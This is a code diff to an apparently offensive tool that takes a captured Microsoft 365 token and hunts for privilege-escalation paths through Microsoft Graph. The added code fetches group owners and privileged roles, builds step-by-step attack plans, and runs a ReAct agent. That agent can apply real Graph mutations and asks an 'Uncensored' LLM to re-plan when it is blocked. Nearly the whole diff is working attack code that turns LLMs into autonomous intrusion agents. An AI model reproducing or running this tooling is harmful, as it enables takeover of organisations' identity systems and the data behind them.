+    """Orchestrates: recon -> edge expansion -> Foundation-Sec-8B selection -> top 3 JSON."""
 
     def __init__(self, token_mgr=None):
         self.token_mgr = token_mgr
@@ -1453,9 +1745,111 @@ class PrivilegeEscalationEngine:
             contacts=contacts,
             misconfigs=[],
             privileged_roles=privileged_roles,
+            group_details=self._build_group_details(groups),
         )
         recon.misconfigs = _detect_misconfigs(recon)
         return recon
+
+    # ----------------------------------------------------------
+    def _build_group_details(self, groups: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
+        """Per-group privilege detail for multi-hop chain hints (capped, best-effort).
+
+        For each group (max 10) fetch owners + group role assignments so the
+        analyst can reason about: take over group -> become owner -> grant role.
+        """
+        if self.token_mgr is None or not groups:
+            return []
+        details: List[Dict[str, Any]] = []
+        _PRIV_NAMES = {
+            "Global Administrator", "Privileged Role Administrator",
+            "Application Administrator", "Company Administrator",
+            "Security Administrator", "Billing Administrator",
+            "User Administrator", "Guest Inviter",
+        }
+        for g in list(groups)[:10]:
+            gid = g.get("id")
+            if not gid:
+                continue
+            item: Dict[str, Any] = {
+                "id": gid,
+                "name": g.get("displayName") or "",
+                "user_is_owner": bool(g.get("is_owner")),
+                "owners": [],
+                "is_privileged": (g.get("displayName") or "") in _PRIV_NAMES,
+            }
+            try:
+                raw = _graph_get(self.token_mgr, f"/groups/{gid}/owners?$select=id,displayName")
+                item["owners"] = [
+                    {"id": o.get("id"), "name": o.get("displayName", "")}
+                    for o in _values(raw)
+                ]
+                # If the user is an owner of this group, upgrade the flat group record too.
+                for o in item["owners"]:
+                    if (g.get("userPrincipalName") and o.get("name") == g.get("userPrincipalName")) or \
+                            (g.get("is_owner") and o.get("id") == g.get("id")):
+                        item["user_is_owner"] = True
+                raw_members = _graph_get(self.token_mgr, f"/groups/{gid}/members?$select=id,objectType,displayName")
+                for m in _values(raw_members):
+                    if (m.get("objectType") or "").lower() == "directoryrole" or \
+                            (m.get("displayName") or "") in _PRIV_NAMES:
+                        item["is_privileged"] = True
+            except Exception as e:
+                logger.debug("[recon] group detail fetch failed for %s: %s", gid, e)
+            details.append(item)
+        return details
+
+    # ----------------------------------------------------------
+    def build_attempt_targets(self) -> List[Dict[str, Any]]:
+        """Execution-ready targets for a downstream ReAct agent (Task 3).
+
+        One target per ranked path (top 3) or, when no ranked paths exist, per
+        candidate edge. Each target carries a per-step execution plan with
+        method/endpoint/verify/rollback so the agent can run them one at a
+        time (dry-run by default) and re-plan on failure.
+        """
+        targets: List[Dict[str, Any]] = []
+        edge_by_id = {e.path_id: e for e in self.edges}
+        sources: List[tuple] = []
+        if self.ranked_paths:
+            for p in self.ranked_paths[:3]:
+                edge = edge_by_id.get(p.path_id)
+                steps = p.steps or (edge.resolved_steps() if edge else [])
+                graph_call = edge.graph_call if edge else ""
+                targets.append(self._make_target(p.path_id, p.name, p.narrative,
+                                                steps, graph_call, edge, p.source))
+        else:
+            for e in self.edges[:5]:
+                targets.append(self._make_target(e.path_id, e.name, e.description,
+                                                e.resolved_steps(), e.graph_call, e, "deterministic"))
+        return targets
+
+    @staticmethod
+    def _make_target(path_id: str, name: str, description: str, steps: List[str],
+                     graph_call: str, edge: Optional[EscalationEdge], source: str) -> Dict[str, Any]:
+        plan: List[Dict[str, Any]] = []
+        for i, step in enumerate(steps or []):
+            plan.append({
+                "step": i + 1,
+                "action": step,
+                "method": "graph",
+                "endpoint": graph_call if i == 0 else "",
+                "verify": f"Confirm the effect of: {step}",
+                "rollback": "" if i == len(steps) - 1 else "Revert via inverse Graph call",
+                "dry_run_default": True,
+            })
+        target: Dict[str, Any] = {
+            "path_id": path_id,
+            "name": name,
+            "description": description,
+            "source": source,
+            "execution_plan": plan,
+        }
+        if edge is not None:
+            target["required_scopes"] = edge.required_scopes
+            target["gain"] = edge.gain
+            target["evidence"] = edge.evidence
+            target["reversible"] = edge.reversibility
+        return target
 
     # ----------------------------------------------------------
     def run(self, recon_data: Optional[ReconData] = None) -> Dict:
@@ -1487,12 +1881,13 @@ class PrivilegeEscalationEngine:
                 "granted_scopes": self.recon_data.granted_scopes,
                 "total_candidate_paths": 0,
                 "candidate_paths": [],
+                "attempt_targets": [],
                 "top_3_paths": [],
             }
 
-        # Phase 3: Qwen3.8-27B-Uncensored selection (with fallbacks)
-        logger.info("[PHASE 3] PATH SELECTION (Qwen3.8-27B-Uncensored)")
-        reasoner = QwenReasoner()
+        # Phase 3: Foundation-Sec-8B analyst selection (with fallbacks)
+        logger.info("[PHASE 3] PATH SELECTION (Foundation-Sec-8B analyst)")
+        reasoner = SecAnalyst()
         self.ranked_paths = reasoner.select_paths(self.edges, self.recon_data)
         logger.info("[+] Top %d paths selected (source: %s)",
                     len(self.ranked_paths),
@@ -1513,7 +1908,7 @@ class PrivilegeEscalationEngine:
 
         return {
             "status": "success",
-            "engine": "deterministic-m365-graph + qwen-27b",
+            "engine": "deterministic-m365-graph + foundation-sec-8b",
             "recon": {
                 "granted_scopes": self.recon_data.granted_scopes,
                 "user": self.recon_data.user.get("userPrincipalName") if self.recon_data.user else None,
@@ -1526,6 +1921,7 @@ class PrivilegeEscalationEngine:
             },
             "total_candidate_paths": len(self.edges),
             "candidate_paths_json": candidate_paths_json,
+            "attempt_targets": self.build_attempt_targets(),
             "selection_source": self.ranked_paths[0].source if self.ranked_paths else "deterministic",
             "top_3_paths": top3,
             "timestamp": datetime.now().isoformat(),
@@ -1569,7 +1965,7 @@ def run_privesc_freestyle(token_mgr, max_turns: int = 8) -> Dict:
     """
     Freestyle, non-deterministic privilege-escalation hunt.
 
-    Hands the captured token to Qwen3.8-27B-Uncensored (QwenExplorer) and lets it
+    Hands the captured token to Foundation-Sec-8B (SecExplorer) and lets it
     freely query Microsoft Graph to discover escalation routes on its own -
     independent of the deterministic EDGE_TABLE used by run_privesc().
 
@@ -1582,13 +1978,13 @@ def run_privesc_freestyle(token_mgr, max_turns: int = 8) -> Dict:
         free-form escalation paths with name/description/steps/probability/evidence).
     """
     try:
-        explorer = QwenExplorer(token_mgr)
+        explorer = SecExplorer(token_mgr)
         explorer.MAX_TURNS = max(1, max_turns)
         paths = explorer.explore()
         return {
             "status": "success",
-            "method": "qwen-27b-freestyle",
-            "model": QWEN_MODEL,
+            "method": "sec-8b-freestyle",
+            "model": SEC_MODEL,
             "queries_explored": explorer.queries_made,
             "paths": paths,
             "path_count": len(paths),
@@ -1599,10 +1995,281 @@ def run_privesc_freestyle(token_mgr, max_turns: int = 8) -> Dict:
         return {
             "status": "error",
             "reason": str(e),
-            "method": "qwen-27b-freestyle",
+            "method": "sec-8b-freestyle",
             "paths": [],
             "path_count": 0,
         }
+
+
+# ============================================================
+# REACT PRIVESC AGENT (Task 4 + 5)
+# ============================================================
+
+class PrivescAgent:
+    """ReAct loop that ATTEMPT discovered escalation paths one step at a time.
+
+    Behaviour:
+      * DRY-RUN by default: every step is validated (scope gate + endpoint
+        sanity) and logged but NOT executed. Pass execute=True to mutate.
+      * One action at a time: run step -> observe -> next step.
+      * On failure the replanner model (REPLAN_MODEL, fallback SEC_MODEL) is
+        asked to re-plan the remaining steps; all LLM traffic is serialised
+        through llm_call().
+      * Granted scopes are re-checked LIVE from the current token before
+        every step (token_mgr.current_scopes() if available, else the JWT).
+      * Structured failure reports: "Attempted path X. Blocked at step N
+        because ..." with suggested_alternative from the replanner.
+    Caps: MAX_STEPS_PER_PATH per path, MAX_PATHS paths per run.
+    """
+
+    MAX_STEPS_PER_PATH = 6
+    MAX_PATHS = 3
+
+    REPLANNER_SYSTEM = (
+        "You are a re-planning agent for an M365/Entra ID privilege-escalation "
+        "automation. The main agent attempted a multi-step path and FAILED at one "
+        "step. Given the goal, the steps already completed, the failed step, the "
+        "error, and the live granted scopes, either:\n"
+        "A) re-plan the REMAINING steps as a concrete list (same scope level as before), or\n"
+        "B) declare the path dead and suggest the closest alternative target.\n"
+        "Return ONLY JSON: {\"decision\": \"replan\" | \"abort\", "
+        "\"reason\": \"one sentence\", \"remaining_steps\": [\"step\", ...], "
+        "\"suggested_alternative\": \"path_id or short label or empty\"}"
+    )
+
+    def __init__(self, token_mgr, execute: bool = False, max_paths: int = 3):
+        self.token_mgr = token_mgr
+        self.execute = execute
+        self.max_paths = min(max_paths, self.MAX_PATHS)
+        self.replan_url = (REPLAN_BASE_URL or SEC_BASE_URL or "").rstrip("/") + "/chat/completions"
+        self.replan_key = REPLAN_API_KEY or SEC_API_KEY
+        self.replan_model = REPLAN_MODEL or SEC_MODEL
+        self.reports: List[Dict[str, Any]] = []
+
+    # ----------------------------------------------------------
+    def live_scopes(self) -> List[str]:
+        """Freshly decode scopes from the CURRENT token (not a cached value)."""
+        if self.token_mgr is not None and hasattr(self.token_mgr, "current_scopes"):
+            try:
+                return self.token_mgr.current_scopes()
+            except Exception:
+                pass
+        if self.token_mgr is not None and getattr(self.token_mgr, "access_token", None):
+            return scopes_from_token(self.token_mgr.access_token)
+        return []
+
+    @staticmethod
+    def _scopes_met(required: List[str], granted: List[str]) -> bool:
+        granted = [s for s in (granted or []) if s]
+        def has(scope: str) -> bool:
+            if scope in granted:
+                return True
+            base, _, variant = scope.rpartition(".")
+            if variant == "ReadWrite" and base and f"{base}.ReadWrite.All" in granted:
+                return True
+            if variant in ("Read", "ReadWrite") and base:
+                if f"{base}.{variant}.All" in granted or f"{base}.ReadWrite.All" in granted:
+                    return True
+            return False
+        return all(has(s) for s in (required or []))
+
+    # ----------------------------------------------------------
+    def run(self, attempt_targets: List[Dict[str, Any]]) -> Dict[str, Any]:
+        targets = (attempt_targets or [])[:self.max_paths]
+        print()
+        print("-" * 60)
+        mode = "EXECUTE (mutations applied)" if self.execute else "DRY-RUN (validate only, nothing is mutated)"
+        print(f"[Agent] ReAct privesc agent starting - {mode} - {len(targets)} target(s)")
+        print("-" * 60)
+        summary: List[Dict[str, Any]] = []
+        for t in targets:
+            report = self._attempt_target(t)
+            self.reports.append(report)
+            summary.append(report)
+            self._print_report(report)
+        return {
+            "status": "success",
+            "mode": "execute" if self.execute else "dry_run",
+            "attempted": len(summary),
+            "succeeded": sum(1 for r in summary if r["outcome"] == "success"),
+            "blocked": sum(1 for r in summary if r["outcome"] in ("blocked", "replanned_blocked")),
+            "reports": summary,
+            "timestamp": datetime.now().isoformat(),
+        }
+
+    # ----------------------------------------------------------
+    def _attempt_target(self, target: Dict[str, Any]) -> Dict[str, Any]:
+        path_id = target.get("path_id", "unknown")
+        steps = [s.get("action") for s in (target.get("execution_plan") or []) if s.get("action")]
+        steps = steps[:self.MAX_STEPS_PER_PATH]
+        required = target.get("required_scopes") or []
+        report: Dict[str, Any] = {
+            "path_id": path_id,
+            "name": target.get("name", ""),
+            "outcome": "success",
+            "blocked_at": None,
+            "reason": None,
+            "evidence": target.get("evidence") or {},
+            "steps_done": [],
+            "suggested_alternative": None,
+            "replanned": False,
+        }
+
+        # Gate 0: live scope check BEFORE starting.
+        scopes = self.live_scopes()
+        if required and not self._scopes_met(required, scopes):
+            report.update(outcome="blocked", blocked_at=0,
+                          reason=f"required scopes {required} not satisfied by live scopes {scopes}")
+            return report
+
+        for i, step in enumerate(steps, 1):
+            # Gate: re-check live scopes before every step (scope may have changed
+            # after a mutation, e.g. the app re-issued a token with new grants).
+            scopes = self.live_scopes()
+            if required and not self._scopes_met(required, scopes):
+                report.update(outcome="blocked", blocked_at=i,
+                              reason=f"live scope re-check failed before step {i}: {scopes}")
+                return report
+            try:
+                ok, detail = self._execute_step(step, self.execute)
+            except Exception as e:
+                ok, detail = False, str(e)
+            if ok:
+                report["steps_done"].append({"step": i, "action": step, "detail": detail})
+                print(f"    [agent] {path_id} step {i}: {'done' if self.execute else 'validated'} - {detail[:100]}")
+                continue
+            # Failure -> replanner re-plan (Task 4) + structured report (Task 5).
+            print(f"    [agent] {path_id} BLOCKED at step {i}: {detail[:160]}")
+            re = self._replan(target, i, step, detail, scopes)
+            report["replanned"] = True
+            if re and re.get("decision") == "replan" and re.get("remaining_steps"):
+                report["suggested_alternative"] = "; ".join(re["remaining_steps"][:4])
+                report.update(outcome="replanned_blocked", blocked_at=i,
+                              reason=re.get("reason") or f"step {i} failed: {detail}")
+            else:
+                report["suggested_alternative"] = (re or {}).get("suggested_alternative") or None
+                report.update(outcome="blocked", blocked_at=i,
+                              reason=((re or {}).get("reason") or f"step {i} failed") + f" ({detail})")
+            return report
+        return report
+
+    # ----------------------------------------------------------
+    def _execute_step(self, step: str, execute: bool) -> tuple:
+        """Execute (or dry-run validate) a single step.
+
+        Steps that are Graph calls (start with GET/PUT/POST/PATCH/DELETE) are
+        mapped to real Graph mutations in execute mode; everything else is
+        validated as a no-op with a note. Never raises for scope/endpoint
+        issues - returns (False, reason) so the agent can re-plan.
+        """
+        s = (step or "").strip()
+        if not s:
+            return False, "empty step"
+        m = re.match(r"^(GET|PUT|POST|PATCH|DELETE)\s+(/\S+)", s)
+        if not m:
+            # Non-Graph action (e.g. 'Verify ...', 'Rotate client secret ...')
+            if not execute:
+                return True, "dry-run: action recorded (no mutation needed to validate)"
+            return True, "recorded (manual/non-Graph action)"
+        method, endpoint = m.group(1), m.group(2)
+        if not execute:
+            return True, f"dry-run: {method} {endpoint} would be invoked"
+        if method == "GET":
+            data = _graph_get(self.token_mgr, endpoint)
+            return True, f"GET ok ({json.dumps(data)[:120]})"
+        # Mutations require an app-only token in most tenants; do the call and
+        # surface the HTTP error so the agent can re-plan.
+        if self.token_mgr is None or not getattr(self.token_mgr, "access_token", None):
+            return False, "no live token for mutation"
+        url = GRAPH_BASE + endpoint
+        resp = requests.request(
+            method, url,
+            headers={"Authorization": f"Bearer {self.token_mgr.access_token}",
+                     "Content-Type": "application/json"},
+            json={}, timeout=30,
+        )
+        if 200 <= resp.status_code < 300:
+            return True, f"{method} ok (HTTP {resp.status_code})"
+        return False, f"{method} failed HTTP {resp.status_code}: {resp.text[:200]}"
+
+    # ----------------------------------------------------------
+    def _replan(self, target: Dict[str, Any], failed_step: int, step: str,
+                error: str, scopes: List[str]) -> Optional[Dict[str, Any]]:
+        """Ask the replanner model (Qwen3.5-9B-Uncensored) to re-plan or abort."""
+        if not (self.replan_key or self.replan_url):
+            return {"decision": "abort", "reason": "replanner not configured", "suggested_alternative": None}
+        payload_steps = [s.get("action") for s in (target.get("execution_plan") or [])]
+        prompt = (
+            "GOAL: " + (target.get("name") or target.get("path_id")) + "\n"
+            "ALL STEPS: " + json.dumps(payload_steps) + "\n"
+            f"COMPLETED: steps 1-{failed_step - 1}\n"
+            f"FAILED AT STEP {failed_step}: {step}\n"
+            f"ERROR: {error[:400]}\n"
+            f"LIVE GRANTED SCOPES: {json.dumps(scopes)}\n"
+        )
+        headers = {"Content-Type": "application/json"}
+        if self.replan_key:
+            headers["Authorization"] = f"Bearer {self.replan_key}"
+        body = {
+            "model": self.replan_model,
+            "messages": [
+                {"role": "system", "content": self.REPLANNER_SYSTEM},
+                {"role": "user", "content": prompt},
+            ],
+            "temperature": 0.2,
+            "max_tokens": 900,
+            "think": False,
+        }
+        try:
+            with llm_call():
+                resp = requests.post(self.replan_url, json=body, headers=headers, timeout=180)
+            if resp.status_code != 200:
+                logger.warning("[Agent] replanner HTTP %s: %s", resp.status_code, resp.text[:200])
+                return None
+            data = _extract_json(resp.json()["choices"][0]["message"]["content"])
+            return data if isinstance(data, dict) else None
+        except Exception as e:
+            logger.warning("[Agent] replanner unavailable: %s", e)
+            return None
+
+    # ----------------------------------------------------------
+    @staticmethod
+    def _print_report(report: Dict[str, Any]):
+        outcome = report["outcome"]
+        bar = "[+]" if outcome == "success" else "[!]"
+        print(f"  {bar} {report['path_id']}: {outcome}"
+              + (f" - blocked at step {report['blocked_at']}" if report["blocked_at"] else ""))
+        if report.get("reason"):
+            print(f"      reason: {report['reason'][:300]}")
+        if report.get("suggested_alternative"):
+            print(f"      alternative: {report['suggested_alternative'][:200]}")
+        # Structured, greppable failure line (Task 5):
+        if outcome in ("blocked", "replanned_blocked"):
+            print(f"      >>> Attempted path {report['path_id']}. Blocked at step {report['blocked_at']} "
+                  f"because {report['reason']}")
+
+
+def run_privesc_agent(token_mgr, attempt_targets: List[Dict[str, Any]],
+                     execute: bool = False, max_paths: int = 3) -> Dict:
+    """Run the ReAct privesc agent over attempt_targets (from run_privesc).
+
+    Args:
+        token_mgr: TokenManager instance from postexp.py (live scope re-checks)
+        attempt_targets: result["attempt_targets"] from run_privesc()
+        execute: False = dry-run (default), True = apply Graph mutations
+        max_paths: how many targets to attempt (capped at 3)
+
+    Returns:
+        Dict with keys: status, mode, attempted, succeeded, blocked, reports
+        (each report is a structured failure/success record incl. the
+        "Attempted path X. Blocked at step N because ..." line).
+    """
+    try:
+        agent = PrivescAgent(token_mgr, execute=execute, max_paths=max_paths)
+        return agent.run(attempt_targets or [])
+    except Exception as e:
+        logger.exception("run_privesc_agent failed")
+        return {"status": "error", "reason": str(e), "reports": []}
 
 
 # ============================================================
@@ -1652,7 +2319,7 @@ def main():
     print("""
     ╔═══════════════════════════════════════════════════════════════╗
     ║        PRIVILEGE ESCALATION ENGINE - AIlicit                  ║
-    ║        Deterministic Graph + Qwen3.8-27B-Uncensored · Top 3        ║
+    ║        Deterministic Graph + Foundation-Sec-8B · Top 3           ║
     ╚═══════════════════════════════════════════════════════════════╝
     """)
 
